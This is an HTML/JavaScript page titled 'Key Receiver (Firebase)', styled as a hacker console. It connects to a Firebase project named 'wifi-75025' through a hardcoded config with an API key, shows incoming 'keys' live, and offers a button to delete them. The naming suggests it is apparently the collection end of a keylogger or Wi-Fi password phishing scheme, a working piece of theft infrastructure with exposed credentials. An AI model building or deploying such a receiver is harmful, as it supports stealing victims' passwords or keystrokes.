<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Key Receiver (Firebase)</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>
    body {
      font-family: 'Courier New', monospace;
      background: url(hck.webp) no-repeat center center fixed;
      background-size: cover;
      color: #00FF00;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    h1 {
      font-size: 2.5rem;
      text-shadow: 0 0 10px #00FF00;
      margin-bottom: 20px;
    }
    .box {
      width: 90%;
      max-width: 600px;
      padding: 20px;
      background: rgba(10, 10, 10, 0.7);
      border-radius: 10px;
      border: 1px solid #00FF00;
      box-shadow: 0 0 15px #00FF00;
      max-height: 60vh;
      overflow: auto;
    }
    .list {
      margin-top: 10px;
      line-height: 1.8;
      word-break: break-word;
      font-size: 1.2rem;
      white-space: pre-wrap;
      overflow-wrap: break-word;
      max-height: 80%;
    }
    .list span {
      display: block;
      padding: 5px;
    }

    /* Custom scrollbar */
    ::-webkit-scrollbar {
      width: 10px;
    }
    ::-webkit-scrollbar-track {
      background: #111;
      border-radius: 5px;
    }
    ::-webkit-scrollbar-thumb {
      background-color: #00FF00;
      border-radius: 5px;
      border: 2px solid #0A0A0A;
    }
    ::-webkit-scrollbar-thumb:hover {
      background-color: #00cc00;
    }

    /* Button style */
    button {
      margin-top: 15px;
      background: #00FF00;
      color: #000;
      font-weight: bold;
      border: none;
      border-radius: 8px;
      padding: 10px 20px;
      font-size: 1rem;
      cursor: pointer;
      box-shadow: 0 0 10px #00FF00;
      transition: 0.2s;
    }
    button:hover {
      background: #00cc00;
      box-shadow: 0 0 20px #00FF00;
    }
  </style>
</head>
<body>
  <h1>Live Keys (Receiver)</h1>
  <div class="box">
    <div id="list" class="list">Waiting for keys...</div>
  </div>
  <button id="clearBtn">ðŸ§¹ Clear All Keys</button>

  <!-- Firebase -->
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyAngaRYpto2-UXa62-Rx-YJAHtOa8fakDw",
      authDomain: "wifi-75025.firebaseapp.com",
      databaseURL: "https://wifi-75025-default-rtdb.firebaseio.com",
      projectId: "wifi-75025",
      storageBucket: "wifi-75025.firebasestorage.app",
      messagingSenderId: "865012452777",
      appId: "1:865012452777:web:c11f00e75326cf8ccd88b8",
      measurementId: "G-6SRG7MV64G"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const list = document.getElementById('list');
    const clearBtn = document.getElementById('clearBtn');

    // Listen for new keys added
    db.ref('keys').limitToLast(100).on('child_added', (snap) => {
      const data = snap.val();
      if (!data) return;
      if (list.textContent.trim() === 'Waiting for keys...') list.textContent = '';
      const newKey = document.createElement('span');
      newKey.textContent = data.key;
      list.appendChild(newKey);
      list.scrollTop = list.scrollHeight;
    });

    // Clear all keys
    clearBtn.addEventListener('click', () => {
      if (confirm('Are you sure you want to delete all keys?')) {
        db.ref('keys').remove()
          .then(() => {
            list.textContent = 'All keys cleared.';
          })
          .catch((err) => {
            alert('Error clearing keys: ' + err.message);
          });
      }
    });
  </script>
</body>
</html>
